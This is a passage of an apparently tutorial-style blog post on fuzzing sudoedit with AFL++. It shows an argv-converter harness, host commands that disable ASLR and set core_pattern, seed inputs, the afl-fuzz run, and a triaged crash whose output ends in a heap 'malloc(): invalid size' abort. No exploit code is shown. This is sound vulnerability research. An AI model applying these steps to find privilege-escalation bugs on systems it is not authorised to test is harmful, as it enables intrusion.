</span></span></span><span style=display:flex><span><span style=color:#75715e> * Converts arguments formatted for AFL&#39;s argv parser,
</span></span></span><span style=display:flex><span><span style=color:#75715e> * to regular arguments as if a command was invoked from the shell.
</span></span></span><span style=display:flex><span><span style=color:#75715e> * For example:
</span></span></span><span style=display:flex><span><span style=color:#75715e> * echo -en &#39;echo\x00baz\x00\x00&#39; | ./afl-argv-converter
</span></span></span><span style=display:flex><span><span style=color:#75715e> * will run:
</span></span></span><span style=display:flex><span><span style=color:#75715e> * echo baz
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[], <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>envp[]) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>AFL_INIT_ARGV</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>extern</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>__progname;
</span></span><span style=display:flex><span>    __progname <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Executing %s with argc=%d:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>], argc);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span>argc; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] argv[%d]=%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, i, argv[i]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Issuing execvpe now.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> res <span style=color:#f92672>=</span> <span style=color:#a6e22e>execvpe</span>(argv[<span style=color:#ae81ff>0</span>], argv, envp);
</span></span><span style=display:flex><span>    <span style=color:#75715e>//we get here only if execvpe fails
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;execvpe&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=running-afl>Running AFL++</h3><p>Let&rsquo;s run AFL++ now.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Run this script in the Host OS, outside of the Docker container</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Required by AFL++</span>
</span></span><span style=display:flex><span>echo core | sudo tee /proc/sys/kernel/core_pattern
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Disable ASLR for reproducibility</span>
</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>0</span> | sudo tee /proc/sys/kernel/randomize_va_space
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Inside the Docker container now</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>INDIR<span style=color:#f92672>=</span>inputs-sudoedit
</span></span><span style=display:flex><span>ODIR<span style=color:#f92672>=</span>outputs-sudoedit
</span></span><span style=display:flex><span>rm -rf  $INDIR $ODIR
</span></span><span style=display:flex><span>mkdir -p $INDIR $ODIR
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Seed</span>
</span></span><span style=display:flex><span>echo -en <span style=color:#e6db74>&#39;sudoedit\x00-h\x00\x00&#39;</span> &gt; $INDIR/1
</span></span><span style=display:flex><span>echo -en <span style=color:#e6db74>&#39;sudoedit\x00-p\x00foobar\x00\x00&#39;</span> &gt; $INDIR/2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>export AFL_SKIP_CPUFREQ<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>afl-fuzz -i <span style=color:#e6db74>&#34;</span>$INDIR<span style=color:#e6db74>&#34;</span> -o <span style=color:#e6db74>&#34;</span>$ODIR<span style=color:#e6db74>&#34;</span> -M fuzzer01 -- /usr/local/bin/sudo-afl
</span></span></code></pre></div><p>This will spawn the main instance and the fuzzer has started! We can spawn multiple instances for parallel fuzzing using the <code>-S</code> flag instead of the <code>-M</code> (<a href=https://aflplus.plus/docs/parallel_fuzzing/#2-single-system-parallelization target=_blank rel="noopener noreferrer">aflplus.plus/docs</a>). And we let it run foe a while&mldr;</p><h3 id=triaging-crashes>Triaging crashes</h3><p>AFL++ will find various inputs that crash the binary and will save them in the outputs folder. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user:~/mount/sudoedit$ ls -l outputs-sudoedit/default/crashes/
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>52</span>
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user   <span style=color:#ae81ff>567</span> Apr  <span style=color:#ae81ff>2</span> 10:20 README.txt
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user   <span style=color:#ae81ff>250</span> Apr  <span style=color:#ae81ff>2</span> 10:20 id:000000,sig:06,src:000318+000311,time:905880,execs:970028,op:splice,rep:2
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user  <span style=color:#ae81ff>1486</span> Apr  <span style=color:#ae81ff>2</span> 10:21 id:000001,sig:06,src:000037+000581,time:947387,execs:1013412,op:splice,rep:6
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user   <span style=color:#ae81ff>166</span> Apr  <span style=color:#ae81ff>2</span> 11:12 id:000002,sig:06,src:000703+000227,time:4058962,execs:3963633,op:splice,rep:12
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user    <span style=color:#ae81ff>83</span> Apr  <span style=color:#ae81ff>2</span> 11:16 id:000003,sig:06,src:000286,time:4265270,execs:4155000,op:havoc,rep:7
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user <span style=color:#ae81ff>27219</span> Apr  <span style=color:#ae81ff>2</span> 11:51 id:000004,sig:06,src:000396+000670,time:6352688,execs:5953361,op:splice,rep:7
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> user user  <span style=color:#ae81ff>1089</span> Apr  <span style=color:#ae81ff>2</span> 13:19 id:000005,sig:06,src:000253+000433,time:11643309,execs:10096980,op:splice,rep:54
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user:~/mount/sudoedit$ xxd -g <span style=color:#ae81ff>1</span> outputs-sudoedit/default/crashes/id<span style=color:#ae81ff>\:</span>000000*
</span></span><span style=display:flex><span>00000000: f3 <span style=color:#ae81ff>64</span> 7f ff <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>68</span> 6c <span style=color:#ae81ff>00</span>  .d..udoedit.-hl.
</span></span><span style=display:flex><span>00000010: 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>49</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>59</span> c8 c8 c8 c8 c8 c8  -i.iId.-.Y......
</span></span><span style=display:flex><span>00000020: <span style=color:#ae81ff>81</span> 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span>  ._l.-i.i.t.s...s
</span></span><span style=display:flex><span>00000030: bd bd bd <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 7f  ...t.s...sss.d..
</span></span><span style=display:flex><span>00000040: <span style=color:#ae81ff>73</span> f3 <span style=color:#ae81ff>64</span> 7f ff ff ff f3 <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>65</span> 3d <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>00</span>  s.d.....dit.e<span style=color:#f92672>=</span>..
</span></span><span style=display:flex><span>00000050: 6b 6f <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 1a 2d <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>64</span>  koit.-h.ad.-h..d
</span></span><span style=display:flex><span>00000060: 6f <span style=color:#ae81ff>00</span> 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> ec <span style=color:#ae81ff>78</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> c8  o.l.-i.ish.xdit.
</span></span><span style=display:flex><span>00000070: c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>81</span>  ..............s.
</span></span><span style=display:flex><span>00000080: 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span>  _l.-i.i.t.s...ss
</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>88</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>35</span> 7f <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span>  sss.t.s...5.55d.
</span></span><span style=display:flex><span>000000a0: 7f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 5b <span style=color:#ae81ff>70</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span>  .ssd_l.-dit<span style=color:#f92672>[</span>p.-i
</span></span><span style=display:flex><span>000000b0: <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>71</span> <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> 5a <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>21</span>  iiiiiis.q$diZ.-!
</span></span><span style=display:flex><span>000000c0: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>79</span> 5c 5c 5c <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>10</span> 5c 5c 5c <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>92</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 1a 2d  0y<span style=color:#ae81ff>\\\.</span>.<span style=color:#ae81ff>\\\.</span>.it.-
</span></span><span style=display:flex><span>000000d0: <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>00</span> 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span>  h.ad..h..do.l.-i
</span></span><span style=display:flex><span>000000e0: <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> ec <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 7f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> 5f  .ish..-i.d..ssd_
</span></span><span style=display:flex><span>000000f0: 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> 2f 2f <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>96</span>                    l.-i//i...
</span></span></code></pre></div><p>We have to manually investigate those crashes to see if they are interesting to us. Let&rsquo;s take one crash and run it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user:~/mount/sudoedit$ cat outputs-sudoedit/default/crashes/id<span style=color:#ae81ff>\:</span>000000* | sudo-afl
</span></span><span style=display:flex><span>after:
</span></span><span style=display:flex><span>argc<span style=color:#f92672>=</span><span style=color:#ae81ff>45</span>
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]=</span>dudoedit
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>1<span style=color:#f92672>]=</span>-hl
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>2<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>3<span style=color:#f92672>]=</span>iId
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>4<span style=color:#f92672>]=</span>-
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>5<span style=color:#f92672>]=</span>Y_l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>6<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>7<span style=color:#f92672>]=</span>it
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>8<span style=color:#f92672>]=</span>s
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>9<span style=color:#f92672>]=</span>st
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>10<span style=color:#f92672>]=</span>s
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>11<span style=color:#f92672>]=</span>sss
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>12<span style=color:#f92672>]=</span>d
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>13<span style=color:#f92672>]=</span>sddite<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>14<span style=color:#f92672>]=</span>koit-h
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>15<span style=color:#f92672>]=</span>ad
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>16<span style=color:#f92672>]=</span>-h
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>17<span style=color:#f92672>]=</span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>18<span style=color:#f92672>]=</span>l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>19<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>20<span style=color:#f92672>]=</span>ishxdits_l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>21<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>22<span style=color:#f92672>]=</span>it
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>23<span style=color:#f92672>]=</span>s
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>24<span style=color:#f92672>]=</span>ssssst
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>25<span style=color:#f92672>]=</span>s
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>26<span style=color:#f92672>]=</span>555d
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>27<span style=color:#f92672>]=</span>ssd_l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>28<span style=color:#f92672>]=</span>-dit<span style=color:#f92672>[</span>p
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>29<span style=color:#f92672>]=</span>-iiiiiiis
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>30<span style=color:#f92672>]=</span>q$diZ
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>31<span style=color:#f92672>]=</span>-!0y<span style=color:#ae81ff>\\\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>argv<span style=color:#f92672>[</span>32<span style=color:#f92672>]=</span><span style=color:#ae81ff>\\\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>argv<span style=color:#f92672>[</span>33<span style=color:#f92672>]=</span>it-h
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>34<span style=color:#f92672>]=</span>ad
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>35<span style=color:#f92672>]=</span>h
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>36<span style=color:#f92672>]=</span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>37<span style=color:#f92672>]=</span>l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>38<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>39<span style=color:#f92672>]=</span>ish
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>40<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>41<span style=color:#f92672>]=</span>d
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>42<span style=color:#f92672>]=</span>ssd_l
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>43<span style=color:#f92672>]=</span>-i//i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>44<span style=color:#f92672>]=</span>
</span></span><span style=display:flex><span>envp:
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>00<span style=color:#f92672>]=</span>HOSTNAME<span style=color:#f92672>=</span>c9414e2626a9
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>01<span style=color:#f92672>]=</span>PWD<span style=color:#f92672>=</span>/home/user/mount/sudoedit
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>02<span style=color:#f92672>]=</span>HOME<span style=color:#f92672>=</span>/home/user
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>03<span style=color:#f92672>]=</span>LS_COLORS<span style=color:#f92672>=</span>rs<span style=color:#f92672>=</span>0:di<span style=color:#f92672>=</span>01;34:ln<span style=color:#f92672>=</span>01;36:mh<span style=color:#f92672>=</span>00:pi<span style=color:#f92672>=</span>40;33:so<span style=color:#f92672>=</span>01;35:do<span style=color:#f92672>=</span>01;35:bd<span style=color:#f92672>=</span>40;33;01:cd<span style=color:#f92672>=</span>40;33;01:or<span style=color:#f92672>=</span>40;31;01:mi<span style=color:#f92672>=</span>00:su<span style=color:#f92672>=</span>37;41:sg<span style=color:#f92672>=</span>30;43:ca<span style=color:#f92672>=</span>00:tw<span style=color:#f92672>=</span>30;42:ow<span style=color:#f92672>=</span>34;42:st<span style=color:#f92672>=</span>37;44:ex<span style=color:#f92672>=</span>01;32:*.tar<span style=color:#f92672>=</span>01;31:*.tgz<span style=color:#f92672>=</span>01;31:*.arc<span style=color:#f92672>=</span>01;31:*.arj<span style=color:#f92672>=</span>01;31:*.taz<span style=color:#f92672>=</span>01;31:*.lha<span style=color:#f92672>=</span>01;31:*.lz4<span style=color:#f92672>=</span>01;31:*.lzh<span style=color:#f92672>=</span>01;31:*.lzma<span style=color:#f92672>=</span>01;31:*.tlz<span style=color:#f92672>=</span>01;31:*.txz<span style=color:#f92672>=</span>01;31:*.tzo<span style=color:#f92672>=</span>01;31:*.t7z<span style=color:#f92672>=</span>01;31:*.zip<span style=color:#f92672>=</span>01;31:*.z<span style=color:#f92672>=</span>01;31:*.dz<span style=color:#f92672>=</span>01;31:*.gz<span style=color:#f92672>=</span>01;31:*.lrz<span style=color:#f92672>=</span>01;31:*.lz<span style=color:#f92672>=</span>01;31:*.lzo<span style=color:#f92672>=</span>01;31:*.xz<span style=color:#f92672>=</span>01;31:*.zst<span style=color:#f92672>=</span>01;31:*.tzst<span style=color:#f92672>=</span>01;31:*.bz2<span style=color:#f92672>=</span>01;31:*.bz<span style=color:#f92672>=</span>01;31:*.tbz<span style=color:#f92672>=</span>01;31:*.tbz2<span style=color:#f92672>=</span>01;31:*.tz<span style=color:#f92672>=</span>01;31:*.deb<span style=color:#f92672>=</span>01;31:*.rpm<span style=color:#f92672>=</span>01;31:*.jar<span style=color:#f92672>=</span>01;31:*.war<span style=color:#f92672>=</span>01;31:*.ear<span style=color:#f92672>=</span>01;31:*.sar<span style=color:#f92672>=</span>01;31:*.rar<span style=color:#f92672>=</span>01;31:*.alz<span style=color:#f92672>=</span>01;31:*.ace<span style=color:#f92672>=</span>01;31:*.zoo<span style=color:#f92672>=</span>01;31:*.cpio<span style=color:#f92672>=</span>01;31:*.7z<span style=color:#f92672>=</span>01;31:*.rz<span style=color:#f92672>=</span>01;31:*.cab<span style=color:#f92672>=</span>01;31:*.wim<span style=color:#f92672>=</span>01;31:*.swm<span style=color:#f92672>=</span>01;31:*.dwm<span style=color:#f92672>=</span>01;31:*.esd<span style=color:#f92672>=</span>01;31:*.avif<span style=color:#f92672>=</span>01;35:*.jpg<span style=color:#f92672>=</span>01;35:*.jpeg<span style=color:#f92672>=</span>01;35:*.mjpg<span style=color:#f92672>=</span>01;35:*.mjpeg<span style=color:#f92672>=</span>01;35:*.gif<span style=color:#f92672>=</span>01;35:*.bmp<span style=color:#f92672>=</span>01;35:*.pbm<span style=color:#f92672>=</span>01;35:*.pgm<span style=color:#f92672>=</span>01;35:*.ppm<span style=color:#f92672>=</span>01;35:*.tga<span style=color:#f92672>=</span>01;35:*.xbm<span style=color:#f92672>=</span>01;35:*.xpm<span style=color:#f92672>=</span>01;35:*.tif<span style=color:#f92672>=</span>01;35:*.tiff<span style=color:#f92672>=</span>01;35:*.png<span style=color:#f92672>=</span>01;35:*.svg<span style=color:#f92672>=</span>01;35:*.svgz<span style=color:#f92672>=</span>01;35:*.mng<span style=color:#f92672>=</span>01;35:*.pcx<span style=color:#f92672>=</span>01;35:*.mov<span style=color:#f92672>=</span>01;35:*.mpg<span style=color:#f92672>=</span>01;35:*.mpeg<span style=color:#f92672>=</span>01;35:*.m2v<span style=color:#f92672>=</span>01;35:*.mkv<span style=color:#f92672>=</span>01;35:*.webm<span style=color:#f92672>=</span>01;35:*.webp<span style=color:#f92672>=</span>01;35:*.ogm<span style=color:#f92672>=</span>01;35:*.mp4<span style=color:#f92672>=</span>01;35:*.m4v<span style=color:#f92672>=</span>01;35:*.mp4v<span style=color:#f92672>=</span>01;35:*.vob<span style=color:#f92672>=</span>01;35:*.qt<span style=color:#f92672>=</span>01;35:*.nuv<span style=color:#f92672>=</span>01;35:*.wmv<span style=color:#f92672>=</span>01;35:*.asf<span style=color:#f92672>=</span>01;35:*.rm<span style=color:#f92672>=</span>01;35:*.rmvb<span style=color:#f92672>=</span>01;35:*.flc<span style=color:#f92672>=</span>01;35:*.avi<span style=color:#f92672>=</span>01;35:*.fli<span style=color:#f92672>=</span>01;35:*.flv<span style=color:#f92672>=</span>01;35:*.gl<span style=color:#f92672>=</span>01;35:*.dl<span style=color:#f92672>=</span>01;35:*.xcf<span style=color:#f92672>=</span>01;35:*.xwd<span style=color:#f92672>=</span>01;35:*.yuv<span style=color:#f92672>=</span>01;35:*.cgm<span style=color:#f92672>=</span>01;35:*.emf<span style=color:#f92672>=</span>01;35:*.ogv<span style=color:#f92672>=</span>01;35:*.ogx<span style=color:#f92672>=</span>01;35:*.aac<span style=color:#f92672>=</span>00;36:*.au<span style=color:#f92672>=</span>00;36:*.flac<span style=color:#f92672>=</span>00;36:*.m4a<span style=color:#f92672>=</span>00;36:*.mid<span style=color:#f92672>=</span>00;36:*.midi<span style=color:#f92672>=</span>00;36:*.mka<span style=color:#f92672>=</span>00;36:*.mp3<span style=color:#f92672>=</span>00;36:*.mpc<span style=color:#f92672>=</span>00;36:*.ogg<span style=color:#f92672>=</span>00;36:*.ra<span style=color:#f92672>=</span>00;36:*.wav<span style=color:#f92672>=</span>00;36:*.oga<span style=color:#f92672>=</span>00;36:*.opus<span style=color:#f92672>=</span>00;36:*.spx<span style=color:#f92672>=</span>00;36:*.xspf<span style=color:#f92672>=</span>00;36:*~<span style=color:#f92672>=</span>00;90:*#<span style=color:#f92672>=</span>00;90:*.bak<span style=color:#f92672>=</span>00;90:*.old<span style=color:#f92672>=</span>00;90:*.orig<span style=color:#f92672>=</span>00;90:*.part<span style=color:#f92672>=</span>00;90:*.rej<span style=color:#f92672>=</span>00;90:*.swp<span style=color:#f92672>=</span>00;90:*.tmp<span style=color:#f92672>=</span>00;90:*.dpkg-dist<span style=color:#f92672>=</span>00;90:*.dpkg-old<span style=color:#f92672>=</span>00;90:*.ucf-dist<span style=color:#f92672>=</span>00;90:*.ucf-new<span style=color:#f92672>=</span>00;90:*.ucf-old<span style=color:#f92672>=</span>00;90:*.rpmnew<span style=color:#f92672>=</span>00;90:*.rpmorig<span style=color:#f92672>=</span>00;90:*.rpmsave<span style=color:#f92672>=</span>00;90:
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>04<span style=color:#f92672>]=</span>TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>05<span style=color:#f92672>]=</span>SHLVL<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>06<span style=color:#f92672>]=</span>LC_CTYPE<span style=color:#f92672>=</span>C.UTF-8
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>07<span style=color:#f92672>]=</span>PS1<span style=color:#f92672>=</span><span style=color:#ae81ff>\[\]\[\]\u\[\]</span>:<span style=color:#ae81ff>\[\]\w\[\]</span>$
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>08<span style=color:#f92672>]=</span>PATH<span style=color:#f92672>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>09<span style=color:#f92672>]=</span>_<span style=color:#f92672>=</span>/usr/local/bin/sudo-afl
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>10<span style=color:#f92672>]=</span>OLDPWD<span style=color:#f92672>=</span>/home/user/mount/sudoedit/02-exploit
</span></span><span style=display:flex><span>__progname<span style=color:#f92672>=</span>dudoedit
</span></span><span style=display:flex><span>malloc<span style=color:#f92672>()</span>: invalid size <span style=color:#f92672>(</span>unsorted<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Aborted
